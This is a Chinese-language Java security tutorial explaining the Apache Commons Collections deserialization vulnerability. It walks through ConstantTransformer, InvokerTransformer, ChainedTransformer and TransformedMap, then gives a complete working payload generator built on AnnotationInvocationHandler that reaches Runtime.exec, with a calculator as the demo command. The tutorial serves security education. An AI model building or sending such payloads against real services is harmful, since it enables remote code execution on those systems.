# Apache Commons Collections反序列化漏洞

`Apache Commons`是`Apache`开源的Java通用类项目在Java中项目中被广泛的使用，`Apache Commons`当中有一个组件叫做`Apache Commons Collections`，主要封装了Java的`Collection（集合）`相关类对象。本节将逐步详解`Collections`反序列化攻击链(仅以`TransformedMap`调用链为示例)最终实现反序列化`RCE`。



## Transformer

`Transformer`是一个接口类，提供了一个对象转换方法`transform`，源码如下：

```java
public interface Transformer {

    /**
     * 将输入对象（保持不变）转换为某个输出对象。
     *
     * @param input  需要转换的对象，应保持不变
     * @return 一个已转换的对象
     * @throws ClassCastException (runtime) 如果输入是错误的类
     * @throws IllegalArgumentException (runtime) 如果输入无效
     * @throws FunctorException (runtime) 如果转换无法完成
     */
    public Object transform(Object input);

}
```

该接口的重要实现类有：`ConstantTransformer`、`invokerTransformer`、`ChainedTransformer`、`TransformedMap` 。



## ConstantTransformer

`ConstantTransformer`类是`Transformer`接口其中的一个实现类，`ConstantTransformer`类重写了`transformer`方法，源码如下：

```java
package org.apache.commons.collections.functors;

import java.io.Serializable;

import org.apache.commons.collections.Transformer;

public class ConstantTransformer implements Transformer, Serializable {

	private static final long serialVersionUID = 6374440726369055124L;

	/** 每次都返回null */
	public static final Transformer NULL_INSTANCE = new ConstantTransformer(null);

	/** The closures to call in turn */
	private final Object iConstant;

	public static Transformer getInstance(Object constantToReturn) {
		if (constantToReturn == null) {
			return NULL_INSTANCE;
		}
    
		return new ConstantTransformer(constantToReturn);
	}

	public ConstantTransformer(Object constantToReturn) {
		super();
		iConstant = constantToReturn;
	}

	public Object transform(Object input) {
		return iConstant;
	}

	public Object getConstant() {
		return iConstant;
	}

}
```

`ConstantTransformer`，常量转换，转换的逻辑也非常的简单：传入对象不会经过任何改变直接返回。例如传入`Runtime.class`进行转换返回的依旧是`Runtime.class`。

**示例 - ConstantTransformer：**

```java
package com.anbai.sec.serializes;

import org.apache.commons.collections.functors.ConstantTransformer;

public class ConstantTransformerTest {

   public static void main(String[] args) {
      Object              obj         = Runtime.class;
      ConstantTransformer transformer = new ConstantTransformer(obj);
      System.out.println(transformer.transform(obj));
   }

}
```

程序执行结果：`class java.lang.Runtime`。



## InvokerTransformer

在`Collections`组件中提供了一个非常重要的类: `org.apache.commons.collections.functors.InvokerTransformer`，这个类实现了`java.io.Serializable`接口。2015年有研究者发现利用`InvokerTransformer`类的`transform`方法可以实现Java反序列化`RCE`，并提供了利用方法：[CommonsCollections1.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java)。

`InvokerTransformer`类`transform`方法实现了类方法动态调用，即采用反射机制动态调用类方法（反射方法名、参数值均可控）并返回该方法执行结果。

**示例 - InvokerTransformer 代码片段：**

```java
public class InvokerTransformer implements Transformer, Serializable {
  
    private static final long serialVersionUID = -8653385846894047688L;
    
    /** 要调用的方法名称 */
    private final String iMethodName;
  
    /** 反射参数类型数组 */
    private final Class[] iParamTypes;
  
    /** 反射参数值数组 */
    private final Object[] iArgs;
  
    // 省去多余的方法和变量
  
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
    
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
    	
        try {
          	// 获取输入类的类对象
            Class cls = input.getClass();
          
          	// 通过输入的方法名和方法参数，获取指定的反射方法对象
            Method method = cls.getMethod(iMethodName, iParamTypes);
          
          	// 反射调用指定的方法并返回方法调用结果
            return method.invoke(input, iArgs);
        } catch (Exception ex) {
            // 省去异常处理部分代码
        }
    }
}
```

**使用`InvokerTransformer`实现调用本地命令执行方法：**

```java
package com.anbai.sec.serializes;

import org.apache.commons.collections.functors.InvokerTransformer;

public class InvokerTransformerTest {

	public static void main(String[] args) {
		// 定义需要执行的本地系统命令
		String cmd = "open -a Calculator.app";

		// 构建transformer对象
		InvokerTransformer transformer = new InvokerTransformer(
				"exec", new Class[]{String.class}, new Object[]{cmd}
		);

		// 传入Runtime实例，执行对象转换操作
		transformer.transform(Runtime.getRuntime());
	}

}
```

上述实例演示了通过`InvokerTransformer`的反射机制来调用`java.lang.Runtime`来实现命令执行，但在真实的漏洞利用场景我们是没法在调用`transformer.transform`的时候直接传入`Runtime.getRuntime()`对象的，因此我们需要学习如何通过`ChainedTransformer`来创建攻击链。



## ChainedTransformer

`org.apache.commons.collections.functors.ChainedTransformer`类封装了`Transformer`的链式调用，我们只需要传入一个`Transformer`数组，`ChainedTransformer`就会依次调用每一个`Transformer`的`transform`方法。

**`ChainedTransformer.java`:**

```java
public class ChainedTransformer implements Transformer, Serializable {
  
  /** The transformers to call in turn */
  private final Transformer[] iTransformers;
  
  // 省去多余的方法和变量
  
  public ChainedTransformer(Transformer[] transformers) {
      super();
      iTransformers = transformers;
  }
  
  public Object transform(Object object) {
      for (int i = 0; i < iTransformers.length; i++) {
          object = iTransformers[i].transform(object);
      }

      return object;
  }
  
}
```

**使用ChainedTransformer实现调用本地命令执行方法：**

```java
package com.anbai.sec.serializes;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class ChainedTransformerTest {

	public static void main(String[] args) throws Exception {
		// 定义需要执行的本地系统命令
		String cmd = "open -a Calculator.app";

		// ChainedTransformer调用链分解

//		// new ConstantTransformer(Runtime.class
//		Class<?> runtimeClass = Runtime.class;
//
//		// new InvokerTransformer("getMethod", new Class[]{
//		// 		String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
//		// ),
//		Class  cls1       = runtimeClass.getClass();
//		Method getMethod  = cls1.getMethod("getMethod", new Class[]{String.class, Class[].class});
//		Method getRuntime = (Method) getMethod.invoke(runtimeClass, new Object[]{"getRuntime", new Class[0]});
//
//		// new InvokerTransformer("invoke", new Class[]{
//		// 		Object.class, Object[].class}, new Object[]{null, new Object[0]}
//		// )
//		Class   cls2         = getRuntime.getClass();
//		Method  invokeMethod = cls2.getMethod("invoke", new Class[]{Object.class, Object[].class});
//		Runtime runtime      = (Runtime) invokeMethod.invoke(getRuntime, new Object[]{null, new Class[0]});
//
//		// new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
//		Class  cls3       = runtime.getClass();
//		Method execMethod = cls3.getMethod("exec", new Class[]{String.class});
//		execMethod.invoke(runtime, cmd);

		Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{
						String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
				),
				new InvokerTransformer("invoke", new Class[]{
						Object.class, Object[].class}, new Object[]{null, new Object[0]}
				),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
		};

		// 创建ChainedTransformer调用链对象
		Transformer transformedChain = new ChainedTransformer(transformers);

		// 执行对象转换操作
		Object transform = transformedChain.transform(null);

		System.out.println(transform);
	}

}
```

通过构建`ChainedTransformer`调用链，最终间接的使用`InvokerTransformer`完成了反射调用`Runtime.getRuntime().exec(cmd)`的逻辑。



## 利用`InvokerTransformer`执行本地命令

上面两个Demo为我们演示了如何使用`InvokerTransformer`执行本地命令，现在我们也就还只剩下两个问题：

1. 如何传入恶意的`ChainedTransformer`；
2. 如何调用`transform`方法执行本地命令；

现在我们已经使用`InvokerTransformer`创建了一个含有恶意调用链的`Transformer`类的Map对象，紧接着我们应该思考如何才能够将调用链串起来并执行。

`org.apache.commons.collections.map.TransformedMap`类间接的实现了`java.util.Map`接口，同时支持对`Map`的`key`或者`value`进行`Transformer`转换，调用`decorate`和`decorateTransform`方法就可以创建一个`TransformedMap`:

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
  	return new TransformedMap(map, keyTransformer, valueTransformer);
}

public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) {
  	// 省去实现代码
}
```

只要调用`TransformedMap`的`setValue/put/putAll`中的任意方法都会调用`InvokerTransformer`类的`transform`方法，从而也就会触发命令执行。

**使用`TransformedMap`类的setValue触发transform示例：**

```java
package com.anbai.sec.serializes;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class TransformedMapTest {

	public static void main(String[] args) {
		String cmd = "open -a Calculator.app";

		Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{
						String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
				),
				new InvokerTransformer("invoke", new Class[]{
						Object.class, Object[].class}, new Object[]{null, new Object[0]}
				),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
		};

		// 创建ChainedTransformer调用链对象
		Transformer transformedChain = new ChainedTransformer(transformers);

		// 创建Map对象
		Map map = new HashMap();
		map.put("value", "value");

		// 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
		Map transformedMap = TransformedMap.decorate(map, null, transformedChain);

		// transformedMap.put("v1", "v2");// 执行put也会触发transform

		// 遍历Map元素，并调用setValue方法
		for (Object obj : transformedMap.entrySet()) {
			Map.Entry entry = (Map.Entry) obj;

			// setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
			entry.setValue("test");
		}

		System.out.println(transformedMap);
	}

}
```

上述代码向我们展示了只要在Java的API中的任何一个类只要符合以下条件，我们就可以在Java反序列化的时候触发`InvokerTransformer`类的`transform`方法实现`RCE`：

1. 实现了`java.io.Serializable`接口；
2. 并且可以传入我们构建的`TransformedMap`对象；
3. 调用了`TransformedMap`中的`setValue/put/putAll`中的任意方法一个方法的类；



## `AnnotationInvocationHandler`

`sun.reflect.annotation.AnnotationInvocationHandler`类实现了`java.lang.reflect.InvocationHandler`(`Java动态代理`)接口和`java.io.Serializable`接口，它还重写了`readObject`方法，在`readObject`方法中还间接的调用了`TransformedMap`中`MapEntry`的`setValue`方法，从而也就触发了`transform`方法，完成了整个攻击链的调用。

**`AnnotationInvocationHandler代码片段：`**

```java
package sun.reflect.annotation;

class AnnotationInvocationHandler implements InvocationHandler, Serializable {
	
  AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
    // 省去代码部分
  }
  
  // Java动态代理的invoke方法
  public Object invoke(Object var1, Method var2, Object[] var3) {
    // 省去代码部分
  }
  
  private void readObject(ObjectInputStream var1) {
  	// 省去代码部分
  }
  
}
```

**`readObject`方法:**

![image-20191220181251898](https://oss.javasec.org/images/image-20191220181251898.png)

上图中的第`352`行中的`memberValues`是`AnnotationInvocationHandler`的成员变量，`memberValues`的值是在`var1.defaultReadObject();`时反序列化生成的，它也就是我们在创建`AnnotationInvocationHandler`时传入的带有恶意攻击链的`TransformedMap`。需要注意的是如果我们想要进入到`var5.setValue`这个逻辑那么我们的序列化的`map`中的`key`必须包含创建`AnnotationInvocationHandler`时传入的注解的方法名。

既然利用`AnnotationInvocationHandler`类我们可以实现反序列化`RCE`，那么在序列化`AnnotationInvocationHandler`对象的时候传入我们精心构建的包含了恶意攻击链的`TransformedMap`对象的序列化字节数组给远程服务，对方在反序列化`AnnotationInvocationHandler`类的时候就会触发整个恶意的攻击链，从而也就实现了远程命令执行了。

**创建`AnnotationInvocationHandler`对象：**

因为`sun.reflect.annotation.AnnotationInvocationHandler`是一个内部API专用的类，在外部我们无法通过类名创建出`AnnotationInvocationHandler`类实例，所以我们需要通过反射的方式创建出`AnnotationInvocationHandler`对象：

```java
// 创建Map对象
Map map = new HashMap();

// map的key名称必须对应创建AnnotationInvocationHandler时使用的注解方法名，比如创建
// AnnotationInvocationHandler时传入的注解是java.lang.annotation.Target，那么map
// 的key必须是@Target注解中的方法名，即：value，否则在反序列化AnnotationInvocationHandler
// 类调用其自身实现的readObject方法时无法通过if判断也就无法通过调用到setValue方法了。
map.put("value", "value");

// 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
Map transformedMap = TransformedMap.decorate(map, null, transformedChain);

// 获取AnnotationInvocationHandler类对象
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

// 获取AnnotationInvocationHandler类的构造方法
Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

// 设置构造方法的访问权限
constructor.setAccessible(true);

// 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：
// Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
Object instance = constructor.newInstance(Target.class, transformedMap);
```

`instance`对象就是我们最终用于序列化的`AnnotationInvocationHandler`对象，我们只需要将这个`instance`序列化后就可以得到用于攻击的`payload`了。

**完整的攻击示例Demo:**

```java
package com.anbai.sec.serializes;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/**
 * Creator: yz
 * Date: 2019/12/16
 */
public class CommonsCollectionsTest {

	public static void main(String[] args) {
		String cmd = "open -a Calculator.app";
    
		Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{
						String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
				),
				new InvokerTransformer("invoke", new Class[]{
						Object.class, Object[].class}, new Object[]{null, new Object[0]}
				),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
		};

		// 创建ChainedTransformer调用链对象
		Transformer transformedChain = new ChainedTransformer(transformers);

		// 创建Map对象
		Map map = new HashMap();
		map.put("value", "value");

		// 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
		Map transformedMap = TransformedMap.decorate(map, null, transformedChain);

//		// 遍历Map元素，并调用setValue方法
//		for (Object obj : transformedMap.entrySet()) {
//			Map.Entry entry = (Map.Entry) obj;
//
//			// setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
//			entry.setValue("test");
//		}
//
////		transformedMap.put("v1", "v2");// 执行put也会触发transform

		try {
			// 获取AnnotationInvocationHandler类对象
			Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

			// 获取AnnotationInvocationHandler类的构造方法
			Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

			// 设置构造方法的访问权限
			constructor.setAccessible(true);

			// 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：
			// Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
			Object instance = constructor.newInstance(Target.class, transformedMap);

			// 创建用于存储payload的二进制输出流对象
			ByteArrayOutputStream baos = new ByteArrayOutputStream();

			// 创建Java对象序列化输出流对象
			ObjectOutputStream out = new ObjectOutputStream(baos);

			// 序列化AnnotationInvocationHandler类
			out.writeObject(instance);
			out.flush();
			out.close();

			// 获取序列化的二进制数组
			byte[] bytes = baos.toByteArray();

			// 输出序列化的二进制数组
			System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));

			// 利用AnnotationInvocationHandler类生成的二进制数组创建二进制输入流对象用于反序列化操作
			ByteArrayInputStream bais = new ByteArrayInputStream(bytes);

			// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
			ObjectInputStream in = new ObjectInputStream(bais);

			// 模拟远程的反序列化过程
			in.readObject();

			// 关闭ObjectInputStream输入流
			in.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
```

反序列化`RCE`调用链如下：

```java
ObjectInputStream.readObject()
  ->AnnotationInvocationHandler.readObject()
  	->TransformedMap.entrySet().iterator().next().setValue()
  		->TransformedMap.checkSetValue()
        ->TransformedMap.transform()
          ->ChainedTransformer.transform()
            ->ConstantTransformer.transform()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Class.getMethod()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Runtime.getRuntime()
            ->InvokerTransformer.transform()
              ->Method.invoke()
                ->Runtime.exec()
```

`Apache Commons Collections`漏洞利用方式也不仅仅只有本节所讲解的利用`AnnotationInvocationHandler`触发`TransformedMap`构建调用链的这一种方式，[ysoserial](https://github.com/frohoff/ysoserial)还提供了多种基于`InstantiateTransformer/InvokerTransformer`构建调用链方式：[LazyMap](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java)、[PriorityQueue](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2.java)、[BadAttributeValueExpException](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java)、[HashSet](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java)、[Hashtable](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections7.java)。